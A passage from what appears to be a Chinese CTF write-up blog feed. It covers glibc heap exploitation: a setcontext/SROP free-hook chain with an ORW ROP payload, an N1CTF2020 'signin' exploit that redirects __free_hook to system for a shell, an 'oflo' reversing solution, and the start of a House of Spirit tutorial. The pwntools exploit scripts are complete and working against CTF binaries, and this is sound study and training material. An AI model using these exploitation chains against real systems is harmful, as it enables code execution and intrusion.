class="hljs-number">0x7fa30df8f0fb</span> &lt;setcontext+<span class="hljs-number">91</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]   <span class="hljs-number">0x7fa30df8f0ff</span> &lt;setcontext+<span class="hljs-number">95</span>&gt;:      <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span>   <span class="hljs-number">0x7fa30df8f10b</span> &lt;setcontext+<span class="hljs-number">107</span>&gt;:     <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7fa30df8f1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;</code></pre></div><p>跳转到：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7fa30df8f1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]   <span class="hljs-number">0x7fa30df8f1cd</span> &lt;setcontext+<span class="hljs-number">301</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span>   <span class="hljs-number">0x7fa30df8f1ce</span> &lt;setcontext+<span class="hljs-number">302</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]   <span class="hljs-number">0x7fa30df8f1d2</span> &lt;setcontext+<span class="hljs-number">306</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]   <span class="hljs-number">0x7fa30df8f1d6</span> &lt;setcontext+<span class="hljs-number">310</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]   <span class="hljs-number">0x7fa30df8f1dd</span> &lt;setcontext+<span class="hljs-number">317</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]   <span class="hljs-number">0x7fa30df8f1e1</span> &lt;setcontext+<span class="hljs-number">321</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]   <span class="hljs-number">0x7fa30df8f1e5</span> &lt;setcontext+<span class="hljs-number">325</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]   <span class="hljs-number">0x7fa30df8f1ec</span> &lt;setcontext+<span class="hljs-number">332</span>&gt;:     <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1ee</span> &lt;setcontext+<span class="hljs-number">334</span>&gt;:     <span class="hljs-keyword">ret</span>       <span class="hljs-number">0x7fa30df8f1ef</span> &lt;setcontext+<span class="hljs-number">335</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x192c7a</span>]        # <span class="hljs-number">0x7fa30e121e70</span>   <span class="hljs-number">0x7fa30df8f1f6</span> &lt;setcontext+<span class="hljs-number">342</span>&gt;:     <span class="hljs-keyword">neg</span>    <span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1f8</span> &lt;setcontext+<span class="hljs-number">344</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:[<span class="hljs-built_in">rcx</span>],<span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1fb</span> &lt;setcontext+<span class="hljs-number">347</span>&gt;:     <span class="hljs-keyword">or</span>     <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xffffffffffffffff</span>   <span class="hljs-number">0x7fa30df8f1ff</span> &lt;setcontext+<span class="hljs-number">351</span>&gt;:     <span class="hljs-keyword">ret</span></code></pre></div><p>可以看到其还是可以正常的控制所有寄存器的，但是其改为了rdx来控制偏移获取数据，这就导致2.27以下的free 一个 存放 好srop frame 的chunk方法失效。</p><h5 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h5><p>在libc中有一条magic gadget：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7f896b381930</span>       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x8</span>]<span class="hljs-number">0x7f896b381934</span>      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>],<span class="hljs-built_in">rax</span><span class="hljs-number">0x7f896b381938</span>       <span class="hljs-keyword">call</span>   <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x20</span>]</code></pre></div><p>其正好可以通过rdi来控制rdx,然后call 对应偏移的函数。</p><p>通常在free 一个 chunk的时候，其rdi 就是这个heap 的地址，当然这个heap的内容也是可以被控制的，则rdx也可以被控制。可以把rdx就还控制为这个heap的地址，然后在heap + 0x20的地方，填好setcontext + 61 地址，这样就可以调用了。</p><p>并且实现的效果还是跟原来一样，利用pwntools的<code>frame = SigreturnFrame()</code>，进行构造所需控制的寄存器。但是在发送frame时，由于刚刚必须的<code>5 * 8</code>的字节占用，所以要发的是<code>frame[40:]</code> 。这样其在设置寄存器，对应偏移找数据时不会出错。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>泄漏libc 和 heap </li><li>fastbin double free 并触发tcache stash，获得一个任意地址写</li><li>打free hook，填上magic  gadget</li><li>free 一块 控制好 内容的chunk，调用 setcontext 读一段orw的rop ，并跳上去</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env pythonfrom pwn import *import timelocal_file  = './gun'elf = ELF(local_file)context.log_level = 'debug'debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',27411)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h's      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(size,data):    sla('&gt;','3')    sla('ice',str(size))    sa('ame',str(data))def load(idx):    sla('&gt;','2')    sla('?',str(idx))def free(idx):    sla('&gt;','1')    sla('time',str(idx))sla('name','chumen77')add(0x500,'chumen77' + '\n')add(0x100,'chumen77' + '\n')load(0)free(1)add(0x100,'\n')load(0)free(1)ru('he ')libcbase = uu64(r(6)) -0x1ec010for i in range(10):    add(0x30,'\n')for i in range(10):    load(10-i)info_addr('libcbase',libcbase)free(10)for i in range(10):    add(0x30,'\n')for i in range(8):    load(7-i)free(7)load(8)free(1)load(10)free(4)r()ru('The ')ru('The ')ru('The ')ru('The ')heapbase = uu64(r(6)) - 0x650info_addr('heapbase',heapbase)for i in range(7):    add(0x30,'\n')magic_gg = 0x154930 + libcbaseadd(0x30,p64(0x1eeb28+libcbase) + '\n')add(0x30,'./flag'  + '\n')add(0x30,p64(0x1eeb28+libcbase) + '\n')add(0x30,p64(magic_gg) + '\n')'0x7f896b381930       mov    rdx,QWORD PTR [rdi+0x8]0x7f896b381934      mov    QWORD PTR [rsp],rax0x7f896b381938       call   QWORD PTR [rdx+0x20]'frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = 0x1eeb28 + libcbase + 0x50frame.rdx = 0x1000frame.rip = libc.search(asm("syscall \nret")).next() + libcbaseframe.rsp = 0x1eeb28 + libcbase + 0x50payload = p64(0) + p64(heapbase + 0x6a0) + p64(0)*2 + p64(libc.sym['setcontext']+61+libcbase) + str(frame)[5*8:]add(0x130, payload + '\n')load(12)free(1)pop_rdi = 0x0000000000026b72 + libcbasepop_rsi = 0x0000000000027529 + libcbasepop_rdx_pop_r12 = 0x000000000011c371 + libcbaseopen = libcbase + libc.symbols["open"]read = libcbase + libc.symbols["read"]puts = libcbase + libc.symbols['puts']rop=flat([pop_rdi,heapbase + 0x620,pop_rsi,0,open,pop_rdi,3,pop_rsi,heapbase + 0x2a0,pop_rdx_pop_r12,0x30,0,read,pop_rdi,heapbase + 0x2a0,puts])sleep(0.1)# debug()s(rop)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N1CTF2020部分wp</title>
    <link href="/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2020部分wp"><a href="#N1CTF2020部分wp" class="headerlink" title="N1CTF2020部分wp"></a>N1CTF2020部分wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>调试one gadget 花了近4小时。。😭</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>c++写的程序，存在add show del的功能，但是进入各自的函数看，看的是稀里糊涂的。个人发现的只是其按照自己的逻辑对内存块idx 1，2进行处理。</p><p>因为功能很简单，可以直接上手调试，来确定程序是如何运作的。</p><p>上手调试后会发现，其根据3个指针来对idx 1、2 处理。</p><h4 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))</code></pre></div><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e70</span>      <span class="hljs-number">0x0000555555769e78</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769e78</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f181</span></code></pre></div><p>再次：</p><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e90</span>      <span class="hljs-number">0x0000555555769ea0</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769ea0</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e90</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000002</span><span class="hljs-number">0x555555769ea0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f161</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p><p>可以这样接着测试free 和 del的功能。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>重点就是bss段储存内存块 1 2 信息的3个指针。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li><p>指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据，一次是8个字节，写完后，指针2会加8。</p></li><li><p>当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> 这样递增。</p></li><li><p>申请完新内存，会把指针1对应的内存块进行free，也就是上一块chunk。并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新。</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5></li><li><p>让指针2减8.</p><h5 id="show-函数"><a href="#show-函数" class="headerlink" title="show 函数"></a>show 函数</h5></li><li><p>打印出指针2减8后对应地址上的数据信息</p></li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="idx-内存块1"><a href="#idx-内存块1" class="headerlink" title="idx 内存块1"></a>idx 内存块1</h4><ul><li><p>add到有0x1010 chunk块，其原来的0x810会放进unsortbin</p></li><li><p>free 多次，让指针2 指向0x810的fd或者bk处，利用show泄漏出libc地址</p></li><li><p>free 多次，让指针2指向0x20的fd处，进行tcache attack，修改其为free hook</p><h4 id="idx-内存块2"><a href="#idx-内存块2" class="headerlink" title="idx 内存块2"></a>idx 内存块2</h4></li><li><p>add数据，准备上free hook，上free hook 改free hook为one gadget</p></li><li><p>紧接着程序，就free 上一个chunk，就会触发free hook</p></li></ul><p>但是写完exp，会发现one gadget没有一个可以打通的，栈上存在很多数据，无法满足。尽管使用realloc进行栈帧调整，也没法子。</p><p>此时看一下寄存器上的信息，发现刚通过free hook跳转过去后，上面的rdi rsi什么的都指向了可控的heap段，那就修改思路，修改free hook 为system，<strong>并且提前修改其rdi指向heap段的数据，修改为<code>sh\x00</code></strong> 。这样再触发free hook就可以<code>system(sh)</code>了。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.242.161.199'</span>,<span class="hljs-number">9990</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">258</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">458</span>+<span class="hljs-number">57</span>):    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libc_base = int(r(<span class="hljs-number">15</span>),<span class="hljs-number">10</span>) - <span class="hljs-number">0x3ebca0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">270</span>):    free(<span class="hljs-number">1</span>)info_addr(<span class="hljs-string">'libcbase'</span>,libc_base)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseadd(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>)add(<span class="hljs-number">1</span>,free_hook<span class="hljs-number">-8</span>)system = libc.sym[<span class="hljs-string">'system'</span>] +libc_baseadd(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">26739</span>)add(<span class="hljs-number">2</span>,system)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>存在花指令，无法正常反编译，直接可以用ida或者gdb进行跟即可。但是不能直接打开，会被反调试ptrace检测到，可以attach上去即可。<strong>（注意是root权限下。）</strong></p><p>开始程序让输入19个字符，关键代码在<code>0x400a69</code>,但是坏的机器码，gdb 下watch一下，发现有流程在根据你<strong>输入的东西</strong>处理这一块的机器码，输入正确了可以执行下去。在关键代码处，可以发现其是在处理14位的数据，但是刚开始输入的是19个，多出来的5个不知道什么用。调试会发现，其就根据前5个字节，对<code>0x400a69</code>块进行处理，一共处理了10次。可以猜到就是<code>n1ctf</code>。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IBvReP.png" srcset="/img/loading.gif" alt></p><p>这块处理完其汇编代码，就正常了。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i ) &#123;   <span class="hljs-keyword">if</span> ( *(&amp;v4 + i) != ((*(<span class="hljs-keyword">char</span> *)(i + a1) + <span class="hljs-number">2</span>) ^ *(<span class="hljs-keyword">char</span> *)(i + a2)) )</code></pre></div><p>进入以后可以看到关键代码。其是在于起初程序，<code>cat /proc/version</code>到的字符串取前14个在进行xor。要是绕过这里，没有相应字符串，就会出现问题。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">key = [<span class="hljs-number">0x35</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x5F</span>]data = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    flag += chr(key[i] ^ (data[i]+<span class="hljs-number">2</span>))print(flag)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spirit</title>
    <link href="/2020/10/09/House%20of%20Spirit/"/>
    <url>/2020/10/09/House%20of%20Spirit/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spirit（下面称为hos）是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，<strong>关键在于能够覆盖一个堆指针变量，使其指向可控的区域</strong>，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fastbin里面，最后再分配出来的时候，就有可能改写我们目标区域（多为函数指针和<strong>返回地址</strong>）。</p><h2 id="核心条件"><a href="#核心条件" class="headerlink" title="核心条件"></a>核心条件</h2><ul><li>有机会覆盖一个堆指针变量，使其指向目标可控的区域</li><li>能够在目标可控位置处伪造 fastbin chunk</li></ul><p>这样将其这个堆指针释放，会放到相应的fastbin，从而达到分配指定地址的 chunk 的目的。</p><h3 id="fastbin-fake-chunk-需要绕过的检测"><a href="#fastbin-fake-chunk-需要绕过的检测" class="headerlink" title="fastbin fake chunk 需要绕过的检测"></a>fastbin fake chunk 需要绕过的检测</h3><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code></li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。(这个大小还是很随意的，不必要非得是fastbin 的size 例如 :0x1234)</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This file demonstrates the house of spirit attack.n"</span>);  <span class="hljs-comment">//调用一次malloc来初始化堆  </span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Calling malloc() once so that it sets up its memory.n"</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//现在我们将覆写一个指针来指向一个伪造的fastbin域</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"We will now overwrite a pointer to point to a fake 'fastbin' region.n"</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;  <span class="hljs-comment">//这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存</span>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));  <span class="hljs-comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n"</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);  <span class="hljs-comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n"</span>);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n"</span>);    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span>  <span class="hljs-comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n"</span>);        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks[<span class="hljs-number">9</span>] = <span 